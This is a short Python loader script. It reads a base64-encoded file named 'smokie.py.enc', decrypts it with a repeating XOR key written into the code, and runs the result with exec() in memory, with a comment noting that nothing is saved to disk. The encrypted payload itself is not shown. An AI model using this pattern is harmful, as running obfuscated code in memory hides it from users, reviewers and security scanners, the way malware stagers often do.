import base64

def xor_encrypt_decrypt(data, key):
    """Encrypts/Decrypts using XOR."""
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

# Read the encrypted script (Base64 encoded) from the .enc file
with open('smokie.py.enc', 'r') as file:
    encrypted_script_base64 = file.read()

# Decrypt the script in memory
key = '@Hmm_Smokie'
encrypted_script = base64.b64decode(encrypted_script_base64).decode()
decrypted_script = xor_encrypt_decrypt(encrypted_script, key)

# Execute the decrypted script in memory without saving it to disk
exec(decrypted_script)
